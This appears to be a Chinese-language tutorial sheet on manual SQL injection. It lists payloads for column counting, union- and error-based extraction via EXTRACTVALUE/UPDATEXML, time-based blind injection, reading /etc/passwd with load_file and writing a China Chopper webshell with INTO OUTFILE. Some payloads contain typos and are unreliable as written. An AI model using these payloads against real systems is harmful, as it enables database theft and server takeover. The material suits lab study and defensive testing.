## 手工注入

有的时候自动化会被禁止使用，比如一些删除和插入，会导致数据库被破坏。

## 常用的 playload

以下为常见的技巧，但是每次注入的技巧都不太一样，基本的技巧具体查看示例[sqli-libs](./sqli-libs.md)

### 常见的注入点

- GET/POST/PUT/DELETE 参数
- [X-Forwarded-For 请求协议头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
- 文件名

## 判断字段数目

```sql
?id=1' order by 4--+
```

判断字段数目,`?id=1' order by 1 --+ `此时页面正常，
继续换更大的数字测试`?id=1' order by 10 --+` 此时页面返回错误，
更换小的数字测试`?id=1' order by 5 --+ `此时页面依然报错，
继续缩小数值测试`?id=1' order by 3 --+ `此时页面返回正常，
更换大的数字测试`?id=1' order by 4 --+` 此时页面返回错误，3 正常，4 错误，说明字段数目就是 3

## 基于报错的注入

通过 id=-1 一个负数不存在的 id 值来触发报错，基于报错来的信息来对 sql 语句进行修改，进而达到目的。

```sql
id=-1' UNION SELECT 1,2,3 --+
```

通过 or 1=1 语句来触发报错

```sql
id=1' or 1=1 UNION SELECT 1,2,3 --+
```

## XPath 相关

[XPath](https://www.w3school.com.cn/xpath/index.asp)

### UPDATEXML

`UPDATEXML()` 是 MySQL 的一个非常有用的函数，它可以让你修改 XML 数据，并将结果作为更新后的 XML 字符串返回。

下面是 `UPDATEXML()` 的基本语法：

```markdown
UPDATEXML(xml_target, xpath_expr, new_xml)
```

参数说明：

- `xml_target` ： 是需要被修改的 XML 字符串。
- `xpath_expr` ： 是 XPath 表达式，用于定位 `xml_target` 中需要被修改的部分。
- `new_xml` ： 是将要替换 `xpath_expr` 定位到的部分的新 XML 字符串。

<details>
<summary>UPDATEXML使用示例</summary>

例如，我们有这样的一个 XML 字符串，想要修改`<url>`的值：

```markdown
<website>
   <name>MySQL Tutorial</name>
   <url>http://www.mysqltutorial.org/</url>
</website>
```

你可以使用以下 `UPDATEXML()` 函数完成此目标：

```sql
SELECT
    UpdateXML('<website><name>MySQL Tutorial</name><url>http://www.mysqltutorial.org/</url></website>',
              '/website/url',
              '<url>http://www.mysqltutorial.com</url>')
```

注意，如果 `xpath_expr` 在 `xml_target` 中定位到多个部分，`UPDATEXML()` 会将所有定位到的部分都替换为 `new_xml`。

</details>

通常是利用了 UPDATEXML() 函数遇到错误时的行为，具体来讲就是当这个函数的第二个参数，即 XPath 表达式无法定位到有效的内容时，UPDATEXML() 函数会返回一个错误，并且这个错误信息中会包含原始的 XPath 表达式。

例如，`select * from test where ide = 1 and (UPDATEXML(1,0x7e,3))`; 由于 0x7e 是~，不属于 xpath 语法格式，因此报出 xpath 语法错误。

### EXTRACTVALUE

`extractvalue` 函数在 MySQL 中是一个 XML 函数，用于从 XML 类型的数据中提取值。

使用语法：

```sql
extractvalue(目标xml文档，xml路径)
```

我们可以操作的是第二个参数，示例如下：

例如，从数据库中获取当前数据库名称：

```sql
1' and extractvalue(1, concat(0x7e,database(),0x7e)) --+
```

获取所有表的名称：

```sql
1' and extractvalue(1, concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)) --+
```
获取某个特定表中的列名：

```sql
1' and extractvalue(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='<table_name>'),0x7e)) --+
```

获取某个特定列中的数据：

```sql
1' and extractvalue(1, concat(0x7e,(select group_concat(<column_name>) from <table_name>),0x7e)) --+
```

## 基于时间的盲注

```sql
1' and slepp(5) --+
--+ select first_name, last_name from dvwa.users where user_id='1' and sleep(5) --'
```

如果等 5 秒之后有回显，则代表有漏洞。

## 读取文件

```sql
=1' and 1=2 union select laod_file('/etc/password') #
```

## 文件写入

文件写入配合菜刀提权。

```sql
=1 and 1=2 union select '菜刀木马内容' into outfile '文件目录+文件名'
```
